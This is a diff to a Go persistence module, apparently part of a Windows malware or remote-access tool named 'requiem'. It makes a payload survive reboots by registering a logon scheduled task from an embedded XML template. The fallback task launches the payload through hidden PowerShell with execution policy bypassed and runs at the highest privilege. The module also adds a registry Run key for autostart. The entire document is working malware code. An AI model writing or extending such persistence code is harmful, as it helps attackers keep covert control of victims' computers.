@@ -1,7 +1,12 @@
 package persistence
 
 import (
+	_ "embed"
 	"fmt"
+	"os"
+	"path/filepath"
+	"strings"
+	"time"
 
 	"requiem/store"
 	"requiem/utils"
@@ -12,6 +17,9 @@ const (
 	AUTO_START    string = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 )
 
+//go:embed schedular.xml
+var schedularXML string
+
 func Persist(filePath string) bool {
 	persisted := 0
 
@@ -19,6 +27,9 @@ func Persist(filePath string) bool {
 		filePath = store.ExecPath
 	}
 
+	// after a bunch of tests, i cant seem
+	// to figure out how to use this for the
+	// xml version
 	command := fmt.Sprintf(
 		"powershell -nop -w hidden -ep bypass -c \"& '%s' %s\"",
 		filePath,
@@ -28,22 +39,46 @@ func Persist(filePath string) bool {
 	if store.TASK_SCHEDULAR && store.IsAdmin {
 		persisted += 1
 
-		err := utils.RunCommand(
-			"schtasks", "/create",
-			"/tn", store.PERSISTENCE_NAME,
-			"/tr", command,
-			"/sc", "ONLOGON",
-			"/rl", "HIGHEST",
-			"/it", "/f",
-		)
+		xml := strings.ReplaceAll(schedularXML, "%THE_CMD%", filePath)
+		xml = strings.ReplaceAll(xml, "%THE_ARG%", store.LAUNCH_KEY)
+		xml = strings.ReplaceAll(xml, "%THE_NAME%", store.PERSISTENCE_NAME)
 
-		if err != nil {
-			persisted -= 1
+		xmlPath := filepath.Join(os.TempDir(), fmt.Sprintf("%d.xml", time.Now().UnixNano()))
+
+		err := os.WriteFile(xmlPath, []byte(xml), 0666)
+		if err == nil {
+			defer os.Remove(xmlPath)
+
+			err := utils.RunCommand(
+				"schtasks", "/create",
+				"/tn", store.PERSISTENCE_NAME,
+				"/xml", xmlPath,
+				"/f",
+			)
+
+			if err != nil {
+				utils.DebugLog(fmt.Sprintf("failed to persist with schedular (xml) - %s", err))
+				persisted -= 1
+			}
+		} else {
+			err := utils.RunCommand(
+				"schtasks", "/create",
+				"/tn", store.PERSISTENCE_NAME,
+				"/tr", command,
+				"/sc", "ONLOGON",
+				"/rl", "HIGHEST",
+				"/it", "/f",
+			)
+
+			if err != nil {
+				utils.DebugLog(fmt.Sprintf("failed to persist with schedular (fallback) - %s", err))
+				persisted -= 1
+			}
 		}
 	}
 
 	if store.AUTO_RUN_REG {
-		persisted += 2
+		persisted += 1
 
 		err := utils.RunCommand(
 			"reg", "delete",
@@ -52,9 +87,10 @@ func Persist(filePath string) bool {
 			"/f",
 		)
 
-		if err != nil {
-			persisted -= 1
-		}
+		// if err != nil {
+		// 	utils.DebugLog(fmt.Sprintf("failed to enabled persistence with registry - %s", err))
+		// 	persisted -= 1
+		// }
 
 		err = utils.RunCommand(
 			"reg", "add",
@@ -66,6 +102,7 @@ func Persist(filePath string) bool {
 		)
 
 		if err != nil {
+			utils.DebugLog(fmt.Sprintf("failed to persist with registry - %s", err))
 			persisted -= 1
 		}
 	}
